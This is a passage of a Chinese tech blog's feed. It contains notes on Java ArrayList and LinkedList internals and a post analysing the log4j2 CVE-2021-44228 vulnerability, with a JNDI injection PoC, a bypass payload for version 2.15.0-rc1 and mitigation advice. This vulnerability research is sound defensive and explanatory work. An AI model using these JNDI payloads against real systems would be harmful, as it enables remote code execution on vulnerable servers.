class="line"><span class="keyword">private</span> Object[] grow(<span class="keyword">int</span> minCapacity) &#123;</span><br><span class="line">      <span class="keyword">int</span> oldCapacity = elementData.length;</span><br><span class="line">      <span class="keyword">if</span> (oldCapacity &gt; <span class="number">0</span> || elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123;</span><br><span class="line">        <span class="comment">// 新的数组长度=旧的数组长度+（新增的长度 和 就数组长度的二分之一 中的最大值）</span></span><br><span class="line">          <span class="keyword">int</span> newCapacity = ArraysSupport.newLength(oldCapacity,</span><br><span class="line">                  minCapacity - oldCapacity, <span class="comment">/* minimum growth */</span></span><br><span class="line">                  oldCapacity &gt;&gt; <span class="number">1</span>           <span class="comment">/* preferred growth */</span>);</span><br><span class="line">          <span class="keyword">return</span> elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> elementData = <span class="keyword">new</span> Object[Math.max(DEFAULT_CAPACITY, minCapacity)];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">      Objects.checkIndex(index, size);<span class="comment">//检查下标合法性</span></span><br><span class="line">      <span class="keyword">return</span> elementData(index); <span class="comment">//直接通过下标获取到数据</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ArrayList用数组作为底层数据结构，线程不安全，在新增一个对象的时候，当长度=数组的长度，会进行扩容，将大小扩容到 (当前长度+Math.max(需要新增得长度, 当前长度/2))，扩容的时候，通过Arrays.copyOf()申请一个新的数组地址。当在获取对象的时候直接通过index下标来获取。</p><p>性能</p><p>查找：通过下标查找，时间复杂度O(1)；通过值查找，时间复杂度O(n)。</p><p>顺序插入：直接在最后通过下标获取到数组位置赋值，时间复杂度O(1)，当长度不够时需要扩容。</p><p>非顺序插入: 需要将插入位置的数据往后移动。</p><h4 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h4><p>LinkedList底层是采用链表来实现的，也是线程不安全的。</p><p>Node类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">      E item;</span><br><span class="line">      Node&lt;E&gt; next; <span class="comment">// next节点</span></span><br><span class="line">      Node&lt;E&gt; prev; <span class="comment">// prev节点</span></span><br><span class="line"></span><br><span class="line">      Node(Node&lt;E&gt; prev, E element, Node&lt;E&gt; next) &#123;</span><br><span class="line">          <span class="keyword">this</span>.item = element;</span><br><span class="line">          <span class="keyword">this</span>.next = next;</span><br><span class="line">          <span class="keyword">this</span>.prev = prev;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>故得出一个结论 LinkedList是双向链表。</p><p>LinkedList插入的基本操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Links e as first element.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">linkFirst</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; f = first;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(<span class="keyword">null</span>, e, f);</span><br><span class="line">    first = newNode;</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="keyword">null</span>)</span><br><span class="line">        last = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        f.prev = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Links e as last element.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">linkLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; l = last;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(l, e, <span class="keyword">null</span>);</span><br><span class="line">    last = newNode;</span><br><span class="line">    <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        l.next = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Inserts element e before non-null Node succ.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">linkBefore</span><span class="params">(E e, Node&lt;E&gt; succ)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert succ != null;</span></span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; pred = succ.prev;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; newNode = <span class="keyword">new</span> Node&lt;&gt;(pred, e, succ);</span><br><span class="line">    succ.prev = newNode;</span><br><span class="line">    <span class="keyword">if</span> (pred == <span class="keyword">null</span>)</span><br><span class="line">        first = newNode;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        pred.next = newNode;</span><br><span class="line">    size++;</span><br><span class="line">    modCount++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Unlinks non-null first node f.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> E <span class="title">unlinkFirst</span><span class="params">(Node&lt;E&gt; f)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert f == first &amp;&amp; f != null;</span></span><br><span class="line">    <span class="keyword">final</span> E element = f.item;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; next = f.next;</span><br><span class="line">    f.item = <span class="keyword">null</span>;</span><br><span class="line">    f.next = <span class="keyword">null</span>; <span class="comment">// help GC</span></span><br><span class="line">    first = next;</span><br><span class="line">    <span class="keyword">if</span> (next == <span class="keyword">null</span>)</span><br><span class="line">        last = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        next.prev = <span class="keyword">null</span>;</span><br><span class="line">    size--;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Unlinks non-null last node l.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> E <span class="title">unlinkLast</span><span class="params">(Node&lt;E&gt; l)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert l == last &amp;&amp; l != null;</span></span><br><span class="line">    <span class="keyword">final</span> E element = l.item;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; prev = l.prev;</span><br><span class="line">    l.item = <span class="keyword">null</span>;</span><br><span class="line">    l.prev = <span class="keyword">null</span>; <span class="comment">// help GC</span></span><br><span class="line">    last = prev;</span><br><span class="line">    <span class="keyword">if</span> (prev == <span class="keyword">null</span>)</span><br><span class="line">        first = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        prev.next = <span class="keyword">null</span>;</span><br><span class="line">    size--;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Unlinks non-null node x.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">E <span class="title">unlink</span><span class="params">(Node&lt;E&gt; x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert x != null;</span></span><br><span class="line">    <span class="keyword">final</span> E element = x.item;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; next = x.next;</span><br><span class="line">    <span class="keyword">final</span> Node&lt;E&gt; prev = x.prev;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev == <span class="keyword">null</span>) &#123;</span><br><span class="line">        first = next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prev.next = next;</span><br><span class="line">        x.prev = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">        last = prev;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        next.prev = prev;</span><br><span class="line">        x.next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    x.item = <span class="keyword">null</span>;</span><br><span class="line">    size--;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查找操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">      checkElementIndex(index);</span><br><span class="line">      <span class="keyword">return</span> node(index).item;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Node&lt;E&gt; <span class="title">node</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 当index在前半边，从前往后找，当index在后半边，从后往前找。</span></span><br><span class="line">      <span class="keyword">if</span> (index &lt; (size &gt;&gt; <span class="number">1</span>)) &#123;</span><br><span class="line">          Node&lt;E&gt; x = first;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">              x = x.next;</span><br><span class="line">          <span class="keyword">return</span> x;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          Node&lt;E&gt; x = last;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">int</span> i = size - <span class="number">1</span>; i &gt; index; i--)</span><br><span class="line">              x = x.prev;</span><br><span class="line">          <span class="keyword">return</span> x;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>LinkedList是使用双向链表实现，故不存在扩容的说法。</p><p>插入：LinkedList提供了linkFirst、linkLast、linkBefore三种插入操作方便，当顺序插入时时间复杂度为O(1)，直接用linkFirst或者linkLast；当在中间固定位置进行插入时候需要先用node(index)定位到具体位置然后使用linkBefore进行插入，查找的时间复杂度为O(n)。</p><p>查找：因为LinkedList的链表实现，当查找第一个或者最后一个的时候，由于LinkedList里面有记录first和last的node，所以时间复杂度为O(1)，查找中间的时候会根据当前index在链表的前半位置（从first向后查找）还是后半位置（从last向前查找）来进行查找，时间复杂度为O(n)。</p><p>ArrayList和LinkedList比较</p><p>查询比较多：1、查找的是第一个或者最后一个的时候，ArrayList和LinkedList一样都是O(1)；2、查找中间元素的时候，ArrayList时间复杂度O(1)，LinkedList时间复杂度O(n)，选ArrayList。</p><p>插入比较多：1、顺序插入，LinkedList时间复杂度O(1)，ArrayList时间复杂度O(1)但是长度不够会进行扩容；2、其他位置插入的时候，LinkedList时间复杂度O(n)，ArrayList会进行数组的copy以及长度不够会进行扩容。</p><h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><h3 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h3><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><h3 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h3><h3 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h3><h3 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h3><h3 id="WeakHashMap"><a href="#WeakHashMap" class="headerlink" title="WeakHashMap"></a>WeakHashMap</h3><h3 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h3><h3 id="EnumMap"><a href="#EnumMap" class="headerlink" title="EnumMap"></a>EnumMap</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Collection&quot;&gt;&lt;a href=&quot;#Collection&quot; class=&quot;headerlink&quot; title=&quot;Collection&quot;&gt;&lt;/a&gt;Collection&lt;/h2&gt;&lt;h3 id=&quot;List&quot;&gt;&lt;a href=&quot;#List&quot; class=&quot;head</summary>
      
    
    
    
    <category term="Java" scheme="http://fireflyingup.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="http://fireflyingup.github.io/tags/Java/"/>
    
    <category term="集合" scheme="http://fireflyingup.github.io/tags/%E9%9B%86%E5%90%88/"/>
    
  </entry>
  
  <entry>
    <title>log4j2(CVE-2021-44228)漏洞分析</title>
    <link href="http://fireflyingup.github.io/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://fireflyingup.github.io/2021/12/12/log4j2-CVE-2021-44228-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-12-12T11:23:30.000Z</published>
    <updated>2023-12-18T01:34:14.863Z</updated>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>log4j 2是apache官方出品的日志框架，是对log4j的一个升级，目前在很多厂商的java项目中被广泛使用，影响力广泛，在2021年11月24日被阿里云团队发现。</p><p>漏洞编号：CVE-2021-44228</p><p>危害等级：严重</p><p>CVSS评分：10</p><p>影响版本：Apache Log4j 2.x &lt; 2.15.0</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">  logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/Exploit&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功利用截图：</p><p><img src="/.io//image-20211212201409411.png" alt="image-20211212201409411"></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>首先从logger.error()方法进去进入第一个关键点logIfEnabled方法，在当前方法的做了一个isEnabled判断，主要是将当前的日志打印级别（logger.error()就是error）和配置的默认级别比较，这也就是为什么logger.info不会触发，而logger.error()会。</p><p><img src="/.io//image-20211212202801393.png" alt="image-20211212202801393"></p><p>然后沿着logMessage方法往下看，中间很多就跳过了，发现他会进入一个PatternLayout的方法，这个方法有很多个PatternFormatter对打印的日志进行格式处理，其中有个PatternFormatter里面有个converter对象的实现为MessagePatternConverter，这个也就是导致漏洞发生的类，在后面的<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">log4j-2.15.0-rc1</a>版本也就是对当前类做了修改。</p><p><img src="/.io//image-20211212204456203.png" alt="image-20211212204456203"></p><p>然后来到MessagePatternConverter这个类的format方法。</p><p><img src="/.io//image-20211212203304968.png" alt="image-20211212203304968"></p><p>可以看到上图红色方框里面的代码，当判断你打印的格式为 ${ 开头就进入replace的这个方法来进行替换，依次进入replace方法-&gt;substitute-&gt;substitute，发现有个resolveVariable的方法处理了变量。</p><p><img src="/.io//image-20211212205152914.png" alt="image-20211212205152914"></p><p>进入resolveVariable方法，发现最后执行了resolver.lookup()的方法，resolver的实现是Interpolator这个类。</p><p><img src="/.io//image-20211212205628288.png" alt="image-20211212205628288"></p><p>进入Interpolator，他通过对poc里面jndi:ldap://127.0.0.1:1389/Exploit获取第一个冒号之前的作为key来map中获取对应的LookUp，可以看到map中又这么多类型的LookUp，这里利用的是jndi的JndiLookUp这个类。</p><p><img src="/.io//image-20211212205803131.png" alt="image-20211212205803131"></p><p>JndiLookUp中又有个JndiManager，又调用了JndiManager的lookUp方法</p><p><img src="/.io//image-20211212210543842.png" alt="image-20211212210543842"></p><p>然后他会调用到LdapCtx的c_lookup方法获取到一个LdapResult对象。</p><p><img src="/.io//image-20211212211703694.png" alt="image-20211212211703694"></p><p>然后调用DirectoryManager.getObjectInstance，这var3是个Reference类型。</p><p><img src="/.io//image-20211212211934271.png" alt="image-20211212211934271"></p><p>在进入就是getObjectFactoryFromReference方法，这里面有class.forName()，然后就加载了类，同时也执行了命令。</p><p><img src="/.io//image-20211212212302770.png" alt="image-20211212212302770"></p><p>最终的地方</p><p><img src="/.io//image-20211212212545968.png" alt="image-20211212212545968"></p><p>整体下来有个疑惑的点，就是不知他通过ldap调过来的class文件放哪了，还需要深入学习，有师傅知道的话，感谢能够告知。</p><p>至此2.x到2.14.1版本的log4j漏洞复现完毕，接下来看log4j的<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">log4j-2.15.0-rc1</a>版本的绕过。</p><p>我开始clone log4j的源代码，并切换到log4j-2.15.0-rc1版本，发现大体上有两处的改动，第一处是前面有说过的MessagePatternConverter这个实现类，apache官方将这个类添加了四个内部实现类，并且将format这个方法在子类里面进行了实现，如下图所示。</p><p><img src="/.io//image-20211212213347905.png" alt="image-20211212213347905"></p><p>format方法如下</p><p><img src="/.io//image-20211212213450327.png" alt="image-20211212213450327"></p><p>会发现四个实现类里面有个LookupMessagePatternConverter的类就是利用点，如下图所示。</p><p><img src="/.io//image-20211212214048786.png" alt="image-20211212214048786"></p><p>但是发现根本到不了这个LookupMessagePatternConverter类，默认去的是SimpleMessagePatternConverter。</p><p><img src="/.io//image-20211212214835473.png" alt="image-20211212214835473"></p><p>我们想要的是进入LookupMessagePatternConverter这个类，所以我看了一下这个formatters的数据由来，发现他通过分析日志的pattern格式（如：%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n ）来选择PatternConverter，比如发现有%d{HH:mm:ss.SSS}就会通过反射来创建一个DatePatternConverter类，所以我这里就想要通过配置文件来让反射出我想要的类，于是配置的xml文件如下，主要添加的就是%msg后面的{lookups}这个。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!-- 具体就是%msg后面的&#123;lookups&#125;这个会使后续的代码反射出LookupMessagePatternConverter --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg&#123;lookups&#125;%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>具体的解析代码如下，有兴趣可以自己去阅读一下源码：</p><p><img src="/.io//image-20211212220626668.png" alt="image-20211212220626668"></p><p><img src="/.io//image-20211212221347525.png" alt="image-20211212221347525"></p><p>满足如下条件既生成想要的类，也就是lookups这个为true，也就是loadLookups(options)这个方法里面当传入的options里面含有lookups字符串的时候返回true。</p><p><img src="/.io//image-20211212221610108.png" alt="image-20211212221610108"></p><p>生成LookupMessagePatternConverter最终的调用链如下：</p><p><img src="/.io//image-20211212221945700.png" alt="image-20211212221945700"></p><p>到此我们又成功用到了这个针对${}的解析，但是在进入JndiManager这个类的lookup里面发现前面加了很多东西，最终poc在下面红色框框的里面由于attributeMap中存在javaFactory这个key，导致直接return null，失败。</p><p><img src="/.io//image-20211212222510834.png" alt="image-20211212222510834"></p><p>然后我看了一下<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">log4j-2.15.0-rc2</a>的修改，发现了一个点，他在代码提交中添加了如下代码，那就反向思维一下，log4j-2.15.0-rc1里面没有返回null，那我们只要让上面的new URI()这个方法爆出URISyntaxException这个异常并且不影响后面的使用就行，异常被捕获但是并未处理导致了这个绕过。</p><p><img src="/.io//image-20211212222826484.png" alt="image-20211212222826484"></p><p>于是在原来的payload上面添加特殊字符绕过，poc如下logger.error(“${jndi:ldap://127.0.0.1:1389/Exploit/ }”);</p><p>到此结束，具体的利用过程就不发出来了，目前官方已经发布了2.15.0版本，大家及时更新。</p><p>全部调用链如下：</p><p><img src="/.io//image-20211212223757355.png" alt="image-20211212223757355"></p><h4 id="poc测试代码地址：https-github-com-fireflyingup-log4j-poc"><a href="#poc测试代码地址：https-github-com-fireflyingup-log4j-poc" class="headerlink" title="poc测试代码地址：https://github.com/fireflyingup/log4j-poc"></a>poc测试代码地址：<a href="https://github.com/fireflyingup/log4j-poc">https://github.com/fireflyingup/log4j-poc</a></h4><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a><strong>安全建议</strong></h3><p>1、排查应用是否引入了Apache log4j-core Jar包，若存在依赖引入，且在受影响版本范围内，则可能存在漏洞影响。请尽快升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0 版本，地址 <a href="https://logging.apache.org/log4j/2.x/download.html">https://logging.apache.org/log4j/2.x/download.html</a></p><p>2、升级已知受影响的应用及组件，如 spring-boot-starter-log4j2/Apache Struts2/Apache Solr/Apache Druid/Apache Flink</p><p>3、临时缓解方案。可升级jdk版本至6u211 / 7u201 / 8u191 / 11.0.1以上，可以在一定程度上限制JNDI等漏洞利用方式。对于大于2.10版本的Log4j，可设置 log4j2.formatMsgNoLookups 为 True，或者将 JndiLookup 类从 classpath 中去除，例如 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</p><p>希望大家守好安全不要做坏事。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/10649#toc-3">https://xz.aliyun.com/t/10649#toc-3</a></p><p><a href="https://help.aliyun.com/noticelist/articleid/1060971232.html">https://help.aliyun.com/noticelist/articleid/1060971232.html</a></p><p><a href="https://logging.apache.org/log4j/2.x/">https://logging.apache.org/log4j/2.x/</a></p><p><a href="https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce">https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;log4j 2是apache官方出品的日志框架，是对log4j的一个升级，目前在很多厂商的java项目中被广泛使用，影响力广泛，在2021年</summary>
      
    
    
    
    <category term="漏洞分析" scheme="http://fireflyingup.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="漏洞" scheme="http://fireflyingup.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="CVE-2021-44228" scheme="http://fireflyingup.github.io/tags/CVE-2021-44228/"/>
    
    <category term="log4j" scheme="http://fireflyingup.github.io/tags/log4j/"/>
    
  </entry>
  
  <entry>
    <title>记一次docker-compose的使用</title>
    <link href="http://fireflyingup.github.io/2021/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1docker-compose%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://fireflyingup.github.io/2021/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1docker-compose%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2021-10-28T16:41:19.000Z</published>
    <updated>2023-12-18T01:33:45.509Z</updated>
    
